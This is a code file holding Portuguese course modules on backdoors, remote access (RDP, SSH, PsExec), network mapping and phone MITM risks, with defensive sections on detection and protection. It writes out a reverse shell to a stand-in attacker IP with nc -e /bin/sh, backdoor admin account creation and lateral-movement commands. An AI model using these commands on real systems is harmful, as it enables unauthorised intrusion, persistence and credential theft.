// Curso completo: Backdoor, Net User, Acesso remoto e Celular/rede
// Conteúdo educacional para defesa e uso autorizado

export const modulosBackdoor = [
  {
    id: 'backdoor-intro',
    titulo: 'O que é backdoor e para que serve',
    badge: 'Conceitos',
    conteudo: `Backdoor é uma forma de acesso que contorna os controles normais de autenticação. Pode ser legítima (manutenção remota autorizada) ou maliciosa (instalada por atacante).

Em segurança ofensiva (pentest): usado para manter acesso após exploração, sempre com autorização.
Em defesa: é preciso detectar e remover backdoors (portas abertas, serviços, tarefas agendadas, registros).

Tipos comuns:
- Serviço ou processo que escuta em uma porta e abre shell quando conectado.
- Tarefa agendada que executa payload periodicamente.
- Chave de registro (Windows) que inicia programa na inicialização.
- Conta de usuário oculta ou com privilégios elevados.`,
  },
  {
    id: 'backdoor-detalhes',
    titulo: 'Backdoor destrinchado – Tipos e funcionamento',
    badge: 'Conceitos',
    conteudo: `Bind shell (shell vinculado):
O backdoor abre uma porta no alvo (ex.: 4444). Quem conectar nessa porta recebe um shell (cmd ou bash). O atacante, no notebook, usa: nc IP_ALVO 4444. Limitação: firewall do alvo ou NAT pode bloquear conexões de entrada.

Reverse shell (shell reverso):
O programa no alvo inicia a conexão de volta para o IP do atacante. No notebook o atacante abre primeiro: nc -lvnp 4444. No alvo (após exploração) executa algo como: nc IP_NOTEBOOK 4444 -e /bin/sh. Vantagem: o celular/PC alvo “sai” para a internet ou rede; muitas vezes firewall não bloqueia.

Web shell:
Backdoor em forma de página web (ex.: .php, .aspx). Atacante acessa pela URL e executa comandos pelo navegador. Comum em servidores web comprometidos.

Persistência:
- Windows: serviço (sc create), tarefa agendada (schtasks), Run no registro, WMI event subscription.
- Linux: systemd service, crontab, .bashrc, /etc/rc.local.
Objetivo: o backdoor volte a funcionar após reinício ou logout.`,
  },
  {
    id: 'backdoor-notebook-alvo',
    titulo: 'Do notebook para um alvo na mesma rede',
    badge: 'Rede',
    conteudo: `Cenário: você está no mesmo Wi‑Fi ou rede que o alvo (PC, servidor ou outro dispositivo). No notebook (ex.: Kali ou Linux) você pode:

1. Descobrir dispositivos na rede:
   nmap -sn 192.168.1.0/24
   arp-scan -l
   (Anote os IPs que aparecem.)

2. Varredura de portas no alvo:
   nmap -sV -sC -p- 192.168.1.XXX

3. Se for um PC/servidor com serviço vulnerável: usar exploit (Metasploit, etc.) para obter shell. Depois, instalar backdoor para retorno.

4. Se o alvo for outro tipo de dispositivo (ex.: câmera IoT, impressora): pesquisar portas e serviços padrão; muitos têm senha de fábrica ou falhas conhecidas.

Importante: só faça isso em rede sua (lab) ou com autorização por escrito. Em rede alheia é crime.`,
  },
  {
    id: 'netuser-windows',
    titulo: 'Net User e Net Localgroup – Windows',
    badge: 'Comandos',
    conteudo: `Comandos para gerenciar usuários e grupos no Windows (CMD ou PowerShell). Use apenas em ambiente autorizado (admin da máquina ou domínio).

Criar usuário:
  net user NomeUsuario Senha123 /add

Remover usuário:
  net user NomeUsuario /delete

Adicionar a um grupo (ex.: administradores):
  net localgroup Administradores NomeUsuario /add

Listar usuários:
  net user

Listar grupos:
  net localgroup

Ver membros de um grupo:
  net localgroup Administradores

Alterar senha:
  net user NomeUsuario NovaSenha

Em pentest: após acesso inicial, atacantes podem criar usuário backdoor (ex.: admin) para retorno. Em defesa: auditar net user e net localgroup; detectar contas novas ou privilegiadas suspeitas.`,
  },
  {
    id: 'acesso-remoto-rdp',
    titulo: 'Acesso remoto – RDP (Windows)',
    badge: 'Rede',
    conteudo: `RDP (Remote Desktop Protocol) – porta 3389. Permite controlar o Windows remotamente com interface gráfica.

Habilitar RDP no alvo (como admin):
  - Painel de Controle → Sistema → Configurações avançadas → Acesso remoto → Permitir conexões.

Conectar a partir do cliente (outro PC):
  mstsc
  - Ou: Win + R → mstsc → Enter. Informar IP ou nome do host e credenciais.

Pela rede (Kali/Linux) com credenciais:
  xfreerdp /u:usuario /p:senha /v:IP_ALVO
  rdesktop -u usuario -p senha IP_ALVO

Em pentest: após obter credencial de usuário com acesso RDP, usa-se RDP para movimento lateral. Em defesa: restringir RDP por firewall (só rede de admin), usar NLA e MFA quando possível.`,
  },
  {
    id: 'acesso-remoto-ssh',
    titulo: 'Acesso remoto – SSH (Linux)',
    badge: 'Rede',
    conteudo: `SSH (Secure Shell) – porta 22. Acesso remoto em linha de comando a servidores Linux.

Conectar:
  ssh usuario@IP_ALVO
  ssh -i chave.pem usuario@IP_ALVO

Copiar arquivo para o alvo (scp):
  scp arquivo.txt usuario@IP_ALVO:/caminho/

Copiar do alvo para sua máquina:
  scp usuario@IP_ALVO:/caminho/arquivo.txt ./

Em pentest: com credencial ou chave roubada, SSH é usado para acesso e movimento lateral. Em defesa: desabilitar login por senha (só chave), usar fail2ban, restringir por IP.`,
  },
  {
    id: 'psexec-wmi',
    titulo: 'PsExec e WMI – Execução remota Windows',
    badge: 'Rede',
    conteudo: `Executar comando ou programa em um Windows remoto pela rede (requer credencial admin).

PsExec (Sysinternals):
  PsExec.exe \\\\IP_ALVO -u usuario -p senha cmd
  PsExec.exe \\\\IP_ALVO -u usuario -p senha -s powershell

WMI (PowerShell):
  Invoke-Command -ComputerName IP_ALVO -Credential (Get-Credential) -ScriptBlock { comando }

Em pentest: movimento lateral típico – de um host comprometido para outros da rede com PsExec/WMI. Em defesa: limitar admin à rede, monitorar uso de PsExec e WMI remoto.`,
  },
  {
    id: 'backdoor-criar-simples',
    titulo: 'Como um backdoor simples funciona (conceito)',
    badge: 'Backdoor',
    conteudo: `Ideia geral (apenas educacional; use só em lab autorizado):

1. No alvo: um programa escuta em uma porta (ex.: 4444). Quando alguém conecta, executa cmd.exe ou /bin/sh e redireciona entrada/saída para a conexão (shell reverso ou bind shell).

2. Bind shell: no alvo abre porta 4444; atacante conecta com nc IP_ALVO 4444 e “entra” no shell do alvo.

3. Reverse shell: no alvo o programa conecta de volta ao IP do atacante (ex.: nc ATACANTE_IP 4444 -e /bin/sh). Atacante antes abre nc -lvnp 4444. Assim o atacante não precisa ter IP acessível pelo alvo em todos os casos.

Persistência: o backdoor pode ser instalado como serviço (Windows) ou systemd (Linux) para iniciar após reinício. Detecção: portas suspeitas, processos desconhecidos, serviços novos.`,
  },
  {
    id: 'navegar-rede-interna',
    titulo: 'Navegar e mapear a rede interna (após acesso)',
    badge: 'Rede',
    conteudo: `Depois de obter shell em um host (autorizado), você pode mapear a rede a partir dele.

Windows (cmd):
  ipconfig
  arp -a
  net view
  net use Z: \\\\outro_pc\\share

Windows (PowerShell):
  Get-NetIPConfiguration
  Get-NetNeighbor
  Test-NetConnection -ComputerName outro_host -Port 445

Linux:
  ip a
  ip route
  arp -a
  ping 192.168.1.1
  nmap -sn 192.168.1.0/24   # se nmap estiver no alvo

Objetivo: listar outros hosts, shares e serviços para movimento lateral. Em defesa: segmentar rede, monitorar net view e conexões SMB/RDP de origem anormal.`,
  },
  {
    id: 'detectar-backdoor',
    titulo: 'Como detectar e remover backdoor (defesa)',
    badge: 'Defesa',
    conteudo: `Detecção:
- Listar portas em escuta: netstat -an (Windows), ss -tulpn (Linux). Procurar portas incomuns (ex.: 4444, 5555).
- Listar serviços: services.msc (Windows), systemctl list-units (Linux). Serviços com nomes genéricos ou desconhecidos.
- Tarefas agendadas: taskschd.msc (Windows), crontab -l (Linux).
- Usuários: net user, net localgroup (Windows); cat /etc/passwd (Linux). Contas criadas recentemente ou com privilégios altos.
- Processos: tasklist (Windows), ps aux (Linux). Processos que escutam em porta ou se conectam a IP externo.

Remoção (após identificar):
- Encerrar processo malicioso; desabilitar e remover serviço; remover tarefa agendada; remover usuário backdoor; corrigir vulnerabilidade que permitiu a instalação.`,
  },
  {
    id: 'celular-rede-riscos',
    titulo: 'Celular na rede – Como um atacante (notebook) enxerga o aparelho',
    badge: 'Celular e rede',
    conteudo: `Quando o celular está no mesmo Wi‑Fi que um notebook (atacante), ambos estão na mesma rede local. O atacante enxerga o celular como mais um host. Conteúdo educacional; uso apenas em lab ou autorizado.

1) Ver o celular na rede: No notebook (Kali/Linux): nmap -sn 192.168.1.0/24 ou arp-scan -l. O celular aparece com um IP (ex.: 192.168.1.15). Ferramentas: Nmap, arp-scan, Fing (app). Conclusão: na mesma Wi‑Fi o celular é "visível" por IP.

2) Varredura no IP do celular: nmap -sV -p- 192.168.1.15. Android/iOS são fechados por padrão; poucas ou nenhuma porta aberta. Podem aparecer mídia, AirDrop (Apple). Se não houver serviço escutando, não há porta para explorar diretamente.

3) Rogue AP (ponto de acesso falso): atacante emite Wi‑Fi com nome parecido. Se a vítima conectar, todo o tráfego passa pelo atacante. Como "bula" o sistema: tráfego HTTP pode ser lido; atacante pode injetar phishing/malware ou redirecionar DNS. Resultado: interceptação de senhas, injeção de conteúdo.

4) MITM com ARP spoofing: atacante se coloca entre celular e roteador (ettercap, bettercap, arpspoof). Como "bula": tráfego da vítima passa pelo atacante; HTTP pode ser lido/alterado; SSL stripping tenta capturar credenciais. Resultado: roubo de sessões, senhas, cookies.

5) Exploração de apps: se algum app abrir porta na rede (raro), atacante pode tentar explorar. Maioria dos apps não expõe porta.

6) Resumo como o sistema é comprometido: rede direta raro (poucas portas). Rogue AP: vítima no Wi‑Fi falso → todo tráfego pelo atacante. ARP spoofing: tráfego desviado → leitura/injeção ou SSL stripping. Malware no celular (app falso): backdoor que se conecta ao C2 do atacante.

Uso apenas em lab/autorizado. Acessar dispositivo alheio sem autorização é crime (Art. 154-A CP).`,
  },
  {
    id: 'celular-rede-como-defender',
    titulo: 'Celular – Como se defender na rede (Wi‑Fi)',
    badge: 'Celular e rede',
    conteudo: `Para não ser alvo quando o celular está na mesma rede que outros (incluindo um notebook de atacante):

1. Não usar Wi‑Fi público para nada sensível; ou use VPN de confiança para criptografar o tráfego até a internet.

2. Em casa/escritório: Wi‑Fi com senha forte (WPA3 ou WPA2), alterar senha padrão do roteador e desativar WPS.

3. Não conectar em redes com nome estranho ou duplicado (ex.: “WiFi_Gratis” ao lado do “WiFi_Gratis” legítimo). Pode ser rogue AP.

4. Manter Android/iOS e apps atualizados. Vulnerabilidades de “acesso pela rede” em celular são corrigidas em atualizações.

5. Não instalar apps de fontes desconhecidas; revisar permissões (acesso à rede, armazenamento).

6. Em rede que não confia: desligar Wi‑Fi e usar só dados móveis para acessar banco, e-mail, etc.

Quem entende como o celular aparece na rede (IP visível, nmap/arp-scan) e os riscos (Rogue AP, MITM/ARP spoofing) consegue se proteger melhor. Em rede que não confia, use dados móveis; em empresa, rede de visitantes separada e MDM.`,
  },
  {
    id: 'celular-notebook-lab',
    titulo: 'Lab: notebook (Kali) e celular na mesma rede – O que dá para fazer',
    badge: 'Celular e rede',
    conteudo: `Em ambiente de lab (sua rede, seu celular ou autorizado):

No notebook com Kali:
1. nmap -sn 192.168.1.0/24   → lista IPs (incluindo o do celular).
2. nmap -sV 192.168.1.XX     → portas e serviços no celular (geralmente poucos).
3. bettercap (ou similar) pode ser usado para ver tráfego na rede e demonstrar riscos de MITM em lab; use só em rede própria e para estudo.

No celular (vítima em um ataque real):
- Se conectar em Wi‑Fi falso ou sofrer MITM, tráfego HTTP (não HTTPS) pode ser visto. Apps e sites que usam HTTPS protegem o conteúdo.
- Malware no celular (instalado por enganação) pode abrir backdoor; aí o “acesso” não é só “pela rede”, e sim pelo malware que se conecta a um servidor do atacante.

Resumo: “entrar no celular pela rede” do notebook geralmente não é um comando mágico; envolve engenharia (rogue AP, MITM) ou exploração de serviço raro. Defesa: rede segura, não conectar em Wi‑Fi suspeito, HTTPS/VPN e aparelho atualizado. O atacante consegue: ver IP do celular; com MITM/Rogue AP, ler ou alterar HTTP; exploração direta só se houver serviço vulnerável (raro).`,
  },
];
